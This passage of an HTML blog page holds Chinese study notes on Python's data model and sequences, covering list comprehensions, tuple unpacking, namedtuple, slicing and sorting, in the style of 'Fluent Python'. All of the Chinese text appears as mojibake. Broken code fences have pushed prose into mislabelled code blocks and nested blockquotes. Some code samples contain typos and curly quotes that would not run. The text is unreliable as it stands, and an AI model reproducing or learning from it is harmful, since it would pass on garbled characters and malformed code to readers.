href="#1-2-4-è‡ªå®šä¹‰çš„å¸ƒå°”å€¼" class="headerlink" title="1.2.4 è‡ªå®šä¹‰çš„å¸ƒå°”å€¼"></a>1.2.4 è‡ªå®šä¹‰çš„å¸ƒå°”å€¼</h4><p>ä¸ºäº†åˆ¤æ–­ä¸€ä¸ªå€¼ <code>x</code> ä¸ºçœŸè¿˜æ˜¯ä¸ºå‡ï¼ŒPython ä¼šè°ƒç”¨ <code>bool(x)</code>, è¿™ä¸ªå‡½æ•°åªèƒ½è¿”å› True æˆ–è€… False.</p><p><code>bool(x)</code> çš„èƒŒåæ˜¯è°ƒç”¨ <code>x.__bool__()</code> çš„ç»“æœã€‚å¦‚æœä¸å­˜åœ¨ <code>__bool__</code> æ–¹æ³•ï¼Œé‚£ä¹ˆ <code>bool(x)</code> ä¼šå°è¯•è°ƒç”¨ <code>x.__len__()</code>, è‹¥è¿”å› 0, åˆ™ä¸º false.</p><p>å¯ä»¥å®ç°ä¸º:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__bool__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>    <span class="hljs-keyword">return</span> bool(<span class="hljs-variable language_">self</span>.x <span class="hljs-keyword">or</span> <span class="hljs-variable language_">self</span>.y)<br></code></pre></td></tr></table></figure><h3 id="1-3-ç‰¹æ®Šæ–¹æ³•ä¸€è§ˆ"><a href="#1-3-ç‰¹æ®Šæ–¹æ³•ä¸€è§ˆ" class="headerlink" title="1.3 ç‰¹æ®Šæ–¹æ³•ä¸€è§ˆ"></a>1.3 ç‰¹æ®Šæ–¹æ³•ä¸€è§ˆ</h3><p><a href="https://docs.python.org/3/reference/datamodel.html">Python è¯­è¨€å‚è€ƒæ‰‹å†Œ</a></p><h3 id="1-4-ä¸ºä»€ä¹ˆ-len-ä¸æ˜¯æ™®é€šæ–¹æ³•"><a href="#1-4-ä¸ºä»€ä¹ˆ-len-ä¸æ˜¯æ™®é€šæ–¹æ³•" class="headerlink" title="1.4 ä¸ºä»€ä¹ˆ len ä¸æ˜¯æ™®é€šæ–¹æ³•"></a>1.4 ä¸ºä»€ä¹ˆ len ä¸æ˜¯æ™®é€šæ–¹æ³•</h3><p>é€Ÿåº¦å¯ä»¥å¾ˆå¿«ã€‚</p><h3 id="1-6-å»¶ä¼¸é˜…è¯»"><a href="#1-6-å»¶ä¼¸é˜…è¯»" class="headerlink" title="1.6 å»¶ä¼¸é˜…è¯»"></a>1.6 å»¶ä¼¸é˜…è¯»</h3><p><a href="https://docs.python.org/3/reference/datamodel.html">Python è¯­è¨€å‚è€ƒæ‰‹å†Œé‡Œçš„ â€œData Modelâ€ ä¸€ç« </a><br><a href="http://stackoverflow.com/users/95810/alex-martelli">Martelli çš„ Stack Overflow ä¸»é¡µ</a></p><p>ç‰¹æ®Šæ–¹æ³•æœ‰æ—¶è¢«ç§°ä¸ºé­”æœ¯æ–¹æ³•ã€‚</p><p>å…ƒå¯¹è±¡åè®®ï¼Œå…ƒå¯¹è±¡æŒ‡é‚£äº›å¯¹å»ºæ„è¯­è¨€æœ¬èº«æ¥è®²å¾ˆé‡è¦çš„å¯¹è±¡ï¼Œåè®®å¯ä»¥çœ‹åšæ¥å£ã€‚å…ƒå¯¹è±¡åè®®å’Œå¯¹è±¡æ¨¡å‹éƒ½æ˜¯æŒ‡å»ºæ„æ ¸å¿ƒè¯­è¨€çš„ API.</p><h1 id="ç¬¬äºŒéƒ¨åˆ†-æ•°æ®ç»“æ„"><a href="#ç¬¬äºŒéƒ¨åˆ†-æ•°æ®ç»“æ„" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ† æ•°æ®ç»“æ„"></a>ç¬¬äºŒéƒ¨åˆ† æ•°æ®ç»“æ„</h1><h2 id="ç¬¬2ç« -åºåˆ—æ„æˆçš„æ•°ç»„"><a href="#ç¬¬2ç« -åºåˆ—æ„æˆçš„æ•°ç»„" class="headerlink" title="ç¬¬2ç«  åºåˆ—æ„æˆçš„æ•°ç»„"></a>ç¬¬2ç«  åºåˆ—æ„æˆçš„æ•°ç»„</h2><h3 id="2-1-å†…ç½®åºåˆ—ç±»å‹æ¦‚è§ˆ"><a href="#2-1-å†…ç½®åºåˆ—ç±»å‹æ¦‚è§ˆ" class="headerlink" title="2.1 å†…ç½®åºåˆ—ç±»å‹æ¦‚è§ˆ"></a>2.1 å†…ç½®åºåˆ—ç±»å‹æ¦‚è§ˆ</h3><ul><li>å®¹å™¨åºåˆ—, listã€tuple å’Œ collections.deque è¿™äº›åºåˆ—èƒ½å­˜æ”¾ä¸åŒç±»å‹çš„æ•°æ®</li><li>æ‰å¹³åºåˆ—ï¼Œstrã€bytesã€bytearrayã€memoryview å’Œ array.array, è¿™äº›åºåˆ—åªèƒ½å®¹çº³ä¸€ç§ç±»å‹</li></ul><p>å®¹å™¨åºåˆ—å­˜æ”¾çš„æ˜¯å®ƒä»¬æ‰€åŒ…å«çš„ä»»æ„ç±»å‹çš„å¯¹è±¡çš„å¼•ç”¨ã€‚</p><p><mark>æ‰å¹³åºåˆ—</mark>å­˜æ”¾çš„æ˜¯å€¼è€Œä¸æ˜¯å¼•ç”¨ï¼Œå…¶ä¸ºä¸€æ®µè¿ç»­çš„å†…å­˜ç©ºé—´ã€‚</p><ul><li>å¯å˜åºåˆ—ï¼Œlistã€bytearrayã€array.arrayã€collections.deque å’Œ memoryview</li><li>ä¸å¯å˜åºåˆ—ï¼Œtupleã€str å’Œ bytes</li></ul><h3 id="2-2-åˆ—è¡¨æ¨å¯¼å’Œç”Ÿæˆå™¨è¡¨è¾¾å¼"><a href="#2-2-åˆ—è¡¨æ¨å¯¼å’Œç”Ÿæˆå™¨è¡¨è¾¾å¼" class="headerlink" title="2.2 åˆ—è¡¨æ¨å¯¼å’Œç”Ÿæˆå™¨è¡¨è¾¾å¼"></a>2.2 åˆ—è¡¨æ¨å¯¼å’Œç”Ÿæˆå™¨è¡¨è¾¾å¼</h3><p>list comprehension(listcomps) æ˜¯æ„å»ºåˆ—è¡¨çš„å¿«æ·æ–¹å¼ã€‚</p><p>ç”Ÿæˆå™¨è¡¨è¾¾å¼(generator expression ç®€ç§°ä¸º genexps)åˆ™å¯ä»¥ç”¨æ¥åˆ›å»ºå…¶ä»–ä»»ä½•ç±»å‹çš„åºåˆ—ã€‚</p><h4 id="2-2-1-åˆ—è¡¨æ¨å¯¼å’Œå¯è¯»æ€§"><a href="#2-2-1-åˆ—è¡¨æ¨å¯¼å’Œå¯è¯»æ€§" class="headerlink" title="2.2.1 åˆ—è¡¨æ¨å¯¼å’Œå¯è¯»æ€§"></a>2.2.1 åˆ—è¡¨æ¨å¯¼å’Œå¯è¯»æ€§</h4><p>é€šå¸¸çš„åŸåˆ™æ˜¯ï¼Œåªç”¨åˆ—è¡¨æ¨å¯¼æ¥åˆ›å»ºæ–°çš„åˆ—è¡¨ï¼Œè€Œä¸”å°½é‡ä¿æŒç®€çŸ­ã€‚</p><p>Python ä¼šçœç•¥ä»£ç é‡Œ <code>[]</code>ã€<code>&#123;&#125;</code> å’Œ <code>()</code> ä¸­çš„æ¢è¡Œã€‚</p><h5 id="åˆ—è¡¨æ¨å¯¼ä¸ä¼šå†æœ‰å˜é‡æ³„éœ²é—®é¢˜"><a href="#åˆ—è¡¨æ¨å¯¼ä¸ä¼šå†æœ‰å˜é‡æ³„éœ²é—®é¢˜" class="headerlink" title="åˆ—è¡¨æ¨å¯¼ä¸ä¼šå†æœ‰å˜é‡æ³„éœ²é—®é¢˜"></a>åˆ—è¡¨æ¨å¯¼ä¸ä¼šå†æœ‰å˜é‡æ³„éœ²é—®é¢˜</h5><p>åˆ—è¡¨æ¨å¯¼å’Œç”Ÿæˆå™¨è¡¨è¾¾å¼åœ¨ Python3 ä¸­éƒ½æœ‰å±€éƒ¨ä½œç”¨åŸŸã€‚</p><h4 id="2-2-2-åˆ—è¡¨æ¨å¯¼åŒ-filter-å’Œ-map-çš„æ¯”è¾ƒ"><a href="#2-2-2-åˆ—è¡¨æ¨å¯¼åŒ-filter-å’Œ-map-çš„æ¯”è¾ƒ" class="headerlink" title="2.2.2 åˆ—è¡¨æ¨å¯¼åŒ filter å’Œ map çš„æ¯”è¾ƒ"></a>2.2.2 åˆ—è¡¨æ¨å¯¼åŒ filter å’Œ map çš„æ¯”è¾ƒ</h4><h4 id="2-2-3-ç¬›å¡å°”ç§¯"><a href="#2-2-3-ç¬›å¡å°”ç§¯" class="headerlink" title="2.2.3 ç¬›å¡å°”ç§¯"></a>2.2.3 ç¬›å¡å°”ç§¯</h4><p>ç¬›å¡å°”ç§¯æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œå…¶é•¿åº¦ç­‰äºè¾“å…¥å˜é‡é•¿åº¦çš„ä¹˜ç§¯ï¼Œå…¶å…ƒç´ ä¸ºè¾“å…¥å˜é‡çš„ä¸€ä¸€ç»„åˆè€Œæ„æˆçš„å…ƒç»„ã€‚</p><p>å¦‚:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mel">  &gt;&gt;&gt; colors = [<span class="hljs-string">&#x27;black&#x27;</span>, <span class="hljs-string">&#x27;white&#x27;</span>]<br>  &gt;&gt;&gt; sizes = [<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>]<br>  &gt;&gt;&gt; tshirts = [(<span class="hljs-keyword">color</span>, <span class="hljs-keyword">size</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">color</span> <span class="hljs-keyword">in</span> colors <span class="hljs-keyword">for</span> <span class="hljs-keyword">size</span> <span class="hljs-keyword">in</span> sizes]<br>   <span class="hljs-string">``</span><span class="hljs-string">`  </span><br><span class="hljs-string">åˆ—è¡¨æ¨å¯¼çš„ä½œç”¨åªæœ‰ä¸€ä¸ªï¼šç”Ÿæˆåˆ—è¡¨ã€‚</span><br><span class="hljs-string">#### 2.2.4 ç”Ÿæˆå™¨è¡¨è¾¾å¼</span><br><span class="hljs-string">ç”Ÿæˆå™¨è¡¨è¾¾å¼éµå¾ªè¿­ä»£å™¨åŸç†ï¼Œå¯ä»¥ä½ä¸ªäººäº§å‡ºå…ƒç´ ï¼Œè€Œä¸æ˜¯å…ˆå»ºç«‹ä¸€ä¸ªå®Œæ•´çš„åˆ—è¡¨ï¼Œç„¶åå†æŠŠè¿™ä¸ªåˆ—è¡¨ä¼ é€’åˆ°æŸä¸ªæ„é€ å‡½æ•°é‡Œã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">ç”Ÿæˆå™¨è¡¨è¾¾å¼çš„è¯­æ³•è·Ÿåˆ—è¡¨æ¨å¯¼å·®ä¸å¤šï¼Œåªæ˜¯æŠŠæ–¹æ‹¬å·æ”¹ä¸ºåœ†æ‹¬å·è€Œå·²ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">å¦‚æœç”Ÿæˆå™¨è¡¨è¾¾å¼æ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨å·¥ç¨‹ä¸­çš„å”¯ä¸€å‚æ•°ï¼Œé‚£ä¹ˆä¸éœ€è¦é¢å¤–ç”¨æ‹¬å·æŠŠå®ƒå›´èµ·æ¥ã€‚</span><br></code></pre></td></tr></table></figure><blockquote><blockquote><blockquote><p>tuple(ord(symbol) for symbol in symbols)<br>   <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">ç”Ÿæˆç¬›å¡å°”ç§¯:</span><br></code></pre></td></tr></table></figure><br>colors &#x3D; [â€˜blackâ€™, â€˜whiteâ€™]<br>sizes &#x3D; [â€˜Sâ€™, â€˜Mâ€™, â€˜Lâ€™]<br>for tshirt in (â€˜%s %sâ€™ % (c, s) for c in colors for s in sizes):<br>     print(tshirt)<br>   <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs clean">### <span class="hljs-number">2.3</span> å…ƒç»„ä¸ä»…ä»…æ˜¯ä¸å¯å˜çš„åˆ—è¡¨<br>å…ƒç»„è¿˜å¯ä»¥ç”¨ä½œæ²¡æœ‰å­—æ®µåçš„è®°å½•ã€‚<br>#### <span class="hljs-number">2.3</span><span class="hljs-number">.1</span> å…ƒç»„å’Œè®°å½•<br>å…ƒç»„å…¶å®æ˜¯å¯¹æ•°æ®çš„è®°å½•: å…ƒç»„ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½å­˜æ”¾äº†è®°å½•ä¸­ä¸€ä¸ªå­—æ®µçš„æ•°æ®ï¼Œå¤–åŠ è¿™ä¸ªå­—æ®µçš„ä½ç½®ã€‚<br><br>æŠŠå…ƒç»„å½“åšä¸€äº›å­—æ®µçš„é›†åˆæ—¶ï¼Œå…¶æ•°é‡å’Œä½ç½®ä¿¡æ¯å°±éå¸¸é‡è¦ã€‚<br><br>å¦‚æœåœ¨ä»»ä½•è¡¨è¾¾å¼é‡Œæˆ‘ä»¬åœ¨å…ƒç»„å†…å¯¹å…ƒç´ æ’åºï¼Œè¿™äº›å…ƒç´ æ‰€æºå¸¦çš„ä¿¡æ¯å°±ä¼šä¸¢å¤±ï¼Œå› ä¸ºè¿™äº›ä¿¡æ¯æ˜¯è·Ÿå®ƒä»¬çš„ä½ç½®æœ‰å…³çš„ã€‚<br><br>for å¾ªç¯å¯ä»¥åˆ†åˆ«æå–å…ƒç»„é‡Œçš„å…ƒç´ ï¼Œä¹Ÿå«åšæ‹†åŒ…(unpacking).<br>#### <span class="hljs-number">2.3</span><span class="hljs-number">.2</span> å…ƒç»„æ‹†åŒ…<br>æœ€å¥½è¾¨è®¤çš„å…ƒç»„æ‹†åŒ…å½¢å¼å°±æ˜¯å¹³è¡Œèµ‹å€¼:<br></code></pre></td></tr></table></figure><br>lax_coordinates &#x3D; (33.9425, -118.408056)<br>latitude, longitude &#x3D; lax_coordinates # å…ƒç»„æ‹†åŒ…<br>   <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">å¯ä»¥ç”¨ <span class="hljs-string">`*`</span> è¿ç®—ç¬¦æŠŠä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡æ‹†å¼€ä½œä¸ºå‡½æ•°çš„å‚æ•°:<br></code></pre></td></tr></table></figure><br>t &#x3D; (20, 8)<br>divmod(*t)<br>   <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">`_` å ä½ç¬¦ç”¨äºå¤„ç†ä¸æ„Ÿå…´è¶£çš„æ•°æ®ã€‚<br>##### ç”¨ * æ¥å¤„ç†å‰©ä¸‹çš„å…ƒç´ <br>åœ¨ Python ä¸­ï¼Œå‡½æ•°ä½¿ç”¨ `*args` æ¥è·å–ä¸ç¡®å®šæ•°é‡çš„å‚æ•°ã€‚<br><br>åœ¨ Python3 ä¸­ï¼Œè¿™ä¸ªæ¦‚å¿µè¢«æ‰©å±•åˆ°äº†å¹³è¡Œèµ‹å€¼ä¸­:<br></code></pre></td></tr></table></figure><br>a, b, *rest &#x3D; range(5)<br>a, b, rest<br>  (0, 1, [2, 3, 4])<br>   <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">åœ¨å¹³è¡Œèµ‹å€¼ä¸­ï¼Œ<span class="hljs-string">`*`</span> å‰ç¼€åªèƒ½ç”¨åœ¨ä¸€ä¸ªå˜é‡åå‰é¢ï¼Œä½†æ˜¯è¿™ä¸ªå˜é‡å¯ä»¥å‡ºç°åœ¨èµ‹å€¼è¡¨è¾¾å¼çš„ä»»ä½•ä½ç½®:<br></code></pre></td></tr></table></figure><br>a, *body, c, d &#x3D; range(5)<br>a, body, c, d<br>  (0, [1, 2], 3, 4)<br>   <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean">#### <span class="hljs-number">2.3</span><span class="hljs-number">.3</span> åµŒå¥—å…ƒç»„æ‹†åŒ…<br>æ¥å—è¡¨è¾¾å¼çš„å…ƒç»„å¯ä»¥æ˜¯åµŒå¥—å¼çš„, å¦‚: (a, b, (c, d)).<br><br>åœ¨ Python3 ä¹‹å‰ï¼Œå…ƒç»„å¯ä»¥ä½œä¸ºå½¢å‚æ”¾åœ¨å‡½æ•°å£°æ˜ä¸­, å¦‚:`def fn(a, (b, c), d):`, ç„¶è€Œ Python3 ä¸å†æ”¯æŒè¿™ç§æ ¼å¼ã€‚<br>#### <span class="hljs-number">2.3</span><span class="hljs-number">.4</span> å…·åå…ƒç»„<br>`collections.namedtuple` å‡½æ•°ç”¨äºæ„å»ºä¸€ä¸ªå¸¦å­—æ®µåçš„å…ƒç»„å’Œä¸€ä¸ªæœ‰åå­—çš„ç±»ã€‚<br><br>åˆ›å»ºä¸€ä¸ªå…·åå…ƒç»„éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ç±»åï¼Œå¦ä¸€ä¸ªæ˜¯ç±»çš„å„ä¸ªå­—æ®µçš„åå­—ï¼Œåè€…å¯ä»¥æ˜¯æœ‰å¤šä¸ªå­—ç¬¦ä¸²ç»„æˆçš„å¯è¿­ä»£å¯¹è±¡ï¼Œæˆ–è€…æ˜¯ç”±ç©ºæ ¼åˆ†éš”å¼€çš„å­—æ®µåç»„æˆçš„ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚<br></code></pre></td></tr></table></figure><br>from collections import namedtuple<br>City &#x3D; namedtuple(â€˜Cityâ€™, â€˜name country population coordinatesâ€™)<br>tokyo &#x3D; City(â€˜Tokyoâ€™, â€˜JPâ€™, â€˜36.933â€™, (35.68922, 139.691667))<br>tokyo<br>  City(name&#x3D;â€™Tokyoâ€™, country&#x3D;â€™JPâ€™, population&#x3D;36.933, coordinates&#x3D;(35.689722, 139.691667))</p><p>tokyo.population<br>  36.933<br>   <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs clean">æ‰€ä»¥è¯´ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ˜¾ç¤ºåœ¨æ‹¬å·ä¹‹å‰. ç­‰å·ä¹‹å‰çš„æ‰æ˜¯çœŸæ­£çš„ç±»ã€‚ä¸€èˆ¬è¿™ä¸¤ä¸ªå–ç›¸åŒçš„å€¼ã€‚<br><br>å…·åå…ƒç»„è¿˜æœ‰ä¸€äº›è‡ªå·±ä¸“æœ‰çš„å±æ€§, æœ€æœ‰ç”¨çš„æœ‰: `_fields` ç±»å±æ€§ã€ç±»æ–¹æ³• `_make(iterable)` å’Œå®ä¾‹æ–¹æ³• `_asdict`(æ‰€ä»¥è¯´ç»™å˜é‡æˆ–è€…å‡½æ•°å‘½åæ—¶é¦–å­—æ¯å°½é‡ä¸ç”¨ä¸‹åˆ’çº¿).<br>#### <span class="hljs-number">2.3</span><span class="hljs-number">.5</span> ä½œä¸ºä¸å¯å˜åˆ—è¡¨çš„å…ƒç»„<br>é™¤äº†è·Ÿå¢å‡å…ƒç´ ç›¸å…³çš„æ–¹æ³•ä¹‹å¤–ï¼Œå…ƒç»„æ”¯æŒåˆ—è¡¨çš„å…¶ä»–æ‰€æœ‰æ–¹æ³•ã€‚<br>### <span class="hljs-number">2.4</span> åˆ‡ç‰‡<br>#### <span class="hljs-number">2.4</span><span class="hljs-number">.1</span> ä¸ºä»€ä¹ˆåˆ‡ç‰‡å’ŒåŒºé—´ä¼šå¿½ç•¥æœ€åä¸€ä¸ªå…ƒç´ <br>è¿™ä¸ªä¹ æƒ¯ç¬¦åˆ Python, C å’Œå…¶ä»–è¯­è¨€é‡Œä»¥ <span class="hljs-number">0</span> ä½œä¸ºèµ·å§‹ä¸‹æ ‡çš„ä¼ ç»Ÿã€‚<br>#### <span class="hljs-number">2.4</span><span class="hljs-number">.2</span> å¯¹å¯¹è±¡è¿›è¡Œåˆ‡ç‰‡<br>å¯ä»¥ç”¨ `s[a:b:c]` çš„å½¢å¼å¯¹ s åœ¨ a å’Œ b ä¹‹é—´ä»¥ c ä¸ºé—´éš”å–å€¼.<br><br>åœ¨å¯¹ `seq[start:stop:step]` è¿›è¡Œæ±‚å€¼çš„æ—¶å€™ï¼ŒPython ä¼šè°ƒç”¨ `seq.__getitem__(slice(start, stop, step))`.<br><br>åˆ‡ç‰‡è¿˜æœ‰ä¸¤ä¸ªé¢å¤–çš„åŠŸèƒ½: å¤šç»´åˆ‡ç‰‡å’Œçœç•¥.<br>#### <span class="hljs-number">2.4</span><span class="hljs-number">.3</span> å¤šç»´åˆ‡ç‰‡å’Œçœç•¥<br>`[]` è¿ç®—ç¬¦é‡Œè¿˜å¯ä»¥ä½¿ç”¨ä»¥é€—å·åˆ†å¼€çš„å¤šä¸ªç´¢å¼•æˆ–è€…æ˜¯åˆ‡ç‰‡.<br><br>è¦å¾—åˆ° `a[i, j]` çš„å€¼ï¼ŒPython ä¼šè°ƒç”¨ `a.__getitem__((i, j))`<br><br>çœç•¥(ellipsis)çš„æ­£ç¡®ä¹¦å†™æ–¹æ³•æ˜¯ä¸‰ä¸ªè‹±è¯­å¥å·(...), å…¶å®é™…ä¸Šæ˜¯ Ellipsis å¯¹è±¡çš„åˆ«åï¼Œè€Œ Ellipsis å¯¹è±¡åˆæ˜¯ ellipsis ç±»çš„å•ä¸€å®ä¾‹ã€‚<br>#### <span class="hljs-number">2.4</span><span class="hljs-number">.4</span> ç»™åˆ‡ç‰‡èµ‹å€¼<br></code></pre></td></tr></table></figure><br>l &#x3D; list(range(10))<br>1<br>  [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]<br>l[2:5] &#x3D; [20, 30]<br>l<br>  [0, 1, 20, 30, 5, 6, 7, 8, 9]<br>   <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">### <span class="hljs-number">2.5</span> å¯¹åºåˆ—ä½¿ç”¨ + å’Œ *<br>Python ç¨‹åºå‘˜ä¼šé»˜è®¤åºåˆ—æ˜¯æ”¯æŒ `+` å’Œ `*` æ“ä½œçš„ã€‚<br><br>`+` ç”¨äºæ‹¼æ¥.<br><br>`*` ç”¨äºå¤åˆ¶å¤šä»½ã€‚<br>#### å»ºç«‹ç”±åˆ—è¡¨ç»„æˆçš„åˆ—è¡¨<br><span class="hljs-title">ç”¨åˆ—è¡¨æ¨å¯¼å®ç°:</span><br></code></pre></td></tr></table></figure><br>board &#x3D; [[â€˜<em>â€˜] * 3 for i in range(3)]<br>board<br>  [[â€˜</em>â€˜, â€˜<em>â€˜, â€˜</em>â€˜], [â€˜<em>â€˜, â€˜</em>â€˜, â€˜<em>â€˜], [â€˜</em>â€˜, â€˜<em>â€˜, â€˜</em>â€˜]]<br>   <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">åŒºåˆ†:</span><br></code></pre></td></tr></table></figure><br>weird_borad &#x3D; [[â€˜_â€™] * 3] * 3</p></blockquote></blockquote></blockquote><pre><code class="hljs">å…¶æœ¬è´¨æ˜¯ä¸€ä¸ªå¯¹è±¡çš„å¤šä¸ªå¼•ç”¨ã€‚### 2.6 åºåˆ—çš„å¢é‡èµ‹å€¼å¢é‡èµ‹å€¼è¿ç®—ç¬¦ `+=` å’Œ `*=` çš„è¡¨ç°å–å†³äºå®ƒä»¬çš„ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡ã€‚`+=` èƒŒåçš„ç‰¹æ®Šæ–¹æ³•æ˜¯ `__iadd__`, å…¶ä¼šå°±åœ°æ”¹åŠ¨ï¼Œæ„æ€å°±æ˜¯ä¸ä¼šå…ˆåšåŠ æ³•å¾—åˆ°ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åèµ‹å€¼ç»™å·¦å€¼.å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰å®ç°è¿™ä¸ªæ–¹æ³•ï¼ŒPython ä¼šé€€ä¸€æ­¥è°ƒç”¨ `__add__`, å³å…ˆåšåŠ æ³•åˆ›å»ºä¸€ä¸ªå¯¹è±¡ç”¨äºèµ‹å€¼.ä»¥ä¸Š `+=` çš„æ¦‚å¿µä¹Ÿé€‚ç”¨äº `*=`. å…¶å¯¹åº”çš„æ˜¯ `__imul__`.å¯¹ä¸å¯å˜åºåˆ—è¿›è¡Œé‡å¤æ‹¼æ¥æ“ä½œæ•ˆç‡ä¼šå¾ˆä½ï¼Œå› ä¸ºæ¯æ¬¡éƒ½æœ‰ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œè€Œè§£é‡Šå™¨éœ€è¦æŠŠåŸæ¥å¯¹è±¡ä¸­çš„å…ƒç´ å…ˆå¤åˆ¶åˆ°æ–°çš„å¯¹è±¡é‡Œï¼Œç„¶åè¿½åŠ æ–°çš„å…ƒç´ ã€‚#### ä¸€ä¸ªå…³äº += çš„è°œé¢˜3ä¸ªæ•™è®­:  - ä¸è¦æŠŠå¯å˜å¯¹è±¡æ”¾åœ¨å…ƒç»„é‡Œ  - å¢é‡èµ‹å€¼ä¸æ˜¯ä¸€ä¸ªåŸå­æ“ä½œ  - æŸ¥çœ‹ Python çš„å­—èŠ‚ç å¯¹äºäº†è§£ä»£ç èƒŒåçš„è¿è¡Œæœºåˆ¶å¾ˆæœ‰å¸®åŠ©### 2.7 list.sort æ–¹æ³•å’Œå†…ç½®å‡½æ•° sorted`list.sort` æ–¹æ³•ä¼šå°±åœ°æ’åºåˆ—è¡¨ï¼Œå…¶è¿”å›å€¼ä¸º None.Python çš„ä¸€ä¸ªæƒ¯ä¾‹: å¦‚æœä¸€ä¸ªå‡½æ•°æˆ–è€…æ–¹æ³•å¯¹å¯¹è±¡è¿›è¡Œçš„æ˜¯å°±åœ°æ”¹åŠ¨ï¼Œé‚£å®ƒå°±åº”è¯¥è¿”å› None.`sorted` å‡½æ•°ä¼šåˆ›å»ºä¸€ä¸ªåˆ—è¡¨ä½œä¸ºè¿”å›å€¼ã€‚ä¸ç®¡ `sorted` æ¥å—çš„æ˜¯ä½•ç§å‚æ•°ï¼Œå…¶æœ€åéƒ½ä¼šè¿”å›ä¸€ä¸ªåˆ—è¡¨ã€‚è¿™ä¸¤ä¸ªéƒ½æœ‰ä¸¤ä¸ªå¯é€‰çš„å…³é”®è¯å‚æ•°:  - reverse, è®¾å®šä¸º True, è¢«æ’åºçš„åºåˆ—é‡Œçš„å…ƒç´ ä¼šä»¥é™åºè¾“å‡ºï¼Œå…¶é»˜è®¤å€¼ä¸º False.  - key, å…¶ä¸ºä¸€ä¸ªåªæœ‰ä¸€ä¸ªå‚æ•°çš„å‡½æ•°ï¼Œä¼šä½œç”¨åˆ°åºåˆ—ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ä¸Šï¼Œäº§ç”Ÿçš„ç»“æœç”¨ä½œæ’åºçš„å¯¹æ¯”å…³é”®è¯å³ä¾æ®ã€‚å¦‚ `key=len` åˆ™ä½¿ç”¨å­—ç¬¦ä¸²çš„é•¿åº¦æ’åºã€‚å…¶é»˜è®¤å€¼ä¸ºæ’ç­‰å‡½æ•°(identity function), ä¹Ÿå°±æ˜¯é»˜è®¤ç”¨å…ƒç´ è‡ªå·±æœ¬èº«çš„å€¼æ¥æ’åºã€‚### 2.8 ç”¨ bisect æ¥ç®¡ç†å·²æ’åºçš„åºåˆ—bisect æ¨¡å—åŒ…å«ä¸¤ä¸ªä¸»è¦å‡½æ•°ï¼Œbisect å’Œ insort, ä¸¤ä¸ªå‡½æ•°éƒ½åˆ©ç”¨äºŒåˆ†æŸ¥æ‰¾ç®—æ³•æ¥åœ¨æœ‰åºåºåˆ—ä¸­æŸ¥æ‰¾æˆ–æ’å…¥å…ƒç´ ã€‚#### 2.8.1 ç”¨ bisect æ¥æœç´¢å…¶å®å°±æ˜¯ç”¨æ¥æ‰¾ä½ç½®ï¼Œå³ index.`bisect(haystack, needle)`ï¼Œåœ¨ haystack é‡Œæœç´¢å¯ä»¥æ”¾ needle 